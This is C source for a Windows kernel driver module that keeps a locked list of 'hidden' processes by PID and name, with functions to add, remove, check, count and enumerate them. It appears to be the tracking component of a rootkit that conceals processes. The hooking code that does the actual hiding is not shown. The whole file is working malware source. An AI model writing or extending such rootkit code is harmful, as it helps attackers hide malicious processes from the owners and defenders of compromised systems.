#include "..\..\includes\shared.h"
#include "..\..\includes\process_defs.h"

LIST_ENTRY g_process_list;
KSPIN_LOCK g_process_lock;

void process_init(void)
{
    InitializeListHead(&g_process_list);
    KeInitializeSpinLock(&g_process_lock);
}

void process_cleanup(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_process_entry pe;

    KeAcquireSpinLock(&g_process_lock, &irql);
    while (!IsListEmpty(&g_process_list)) {
        entry = RemoveHeadList(&g_process_list);
        pe = CONTAINING_RECORD(entry, hidden_process_entry, list);
        ExFreePool(pe);
    }
    KeReleaseSpinLock(&g_process_lock, irql);
}

NTSTATUS process_add(ULONG pid, PCWSTR name)
{
    phidden_process_entry pe;
    KIRQL irql;
    UNICODE_STRING us;

    pe = (phidden_process_entry)ExAllocatePoolWithTag(NonPagedPool, sizeof(hidden_process_entry), 'prch');
    if (!pe) return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(pe, sizeof(hidden_process_entry));
    pe->pid = pid;
    if (name) {
        RtlInitUnicodeString(&us, name);
        if (us.Length > sizeof(pe->name) - sizeof(WCHAR)) us.Length = (USHORT)(sizeof(pe->name) - sizeof(WCHAR));
        if (us.Length > 0) RtlCopyMemory(pe->name, name, us.Length);
    }
    KeAcquireSpinLock(&g_process_lock, &irql);
    InsertTailList(&g_process_list, &pe->list);
    KeReleaseSpinLock(&g_process_lock, irql);
    return STATUS_SUCCESS;
}

NTSTATUS process_remove(ULONG pid)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_process_entry pe;

    KeAcquireSpinLock(&g_process_lock, &irql);
    for (entry = g_process_list.Flink; entry != &g_process_list; entry = entry->Flink) {
        pe = CONTAINING_RECORD(entry, hidden_process_entry, list);
        if (pe->pid == pid) {
            RemoveEntryList(&pe->list);
            KeReleaseSpinLock(&g_process_lock, irql);
            ExFreePool(pe);
            return STATUS_SUCCESS;
        }
    }
    KeReleaseSpinLock(&g_process_lock, irql);
    return STATUS_NOT_FOUND;
}

BOOLEAN process_is_hidden(ULONG pid)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_process_entry pe;
    BOOLEAN found = FALSE;

    KeAcquireSpinLock(&g_process_lock, &irql);
    for (entry = g_process_list.Flink; entry != &g_process_list; entry = entry->Flink) {
        pe = CONTAINING_RECORD(entry, hidden_process_entry, list);
        if (pe->pid == pid) {
            found = TRUE;
            break;
        }
    }
    KeReleaseSpinLock(&g_process_lock, irql);
    return found;
}

ULONG process_count(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    ULONG count = 0;

    KeAcquireSpinLock(&g_process_lock, &irql);
    for (entry = g_process_list.Flink; entry != &g_process_list; entry = entry->Flink)
        count++;
    KeReleaseSpinLock(&g_process_lock, irql);
    return count;
}

NTSTATUS process_list(PVOID buffer, ULONG size, PULONG needed)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_process_entry pe;
    pprocess_request pr = (pprocess_request)buffer;
    ULONG count = 0;

    *needed = process_count() * sizeof(process_request);
    if (size < *needed) return STATUS_BUFFER_TOO_SMALL;
    KeAcquireSpinLock(&g_process_lock, &irql);
    for (entry = g_process_list.Flink; entry != &g_process_list; entry = entry->Flink) {
        pe = CONTAINING_RECORD(entry, hidden_process_entry, list);
        pr[count].pid = pe->pid;
        RtlCopyMemory(pr[count].name, pe->name, sizeof(pe->name));
        count++;
    }
    KeReleaseSpinLock(&g_process_lock, irql);
    return STATUS_SUCCESS;
}
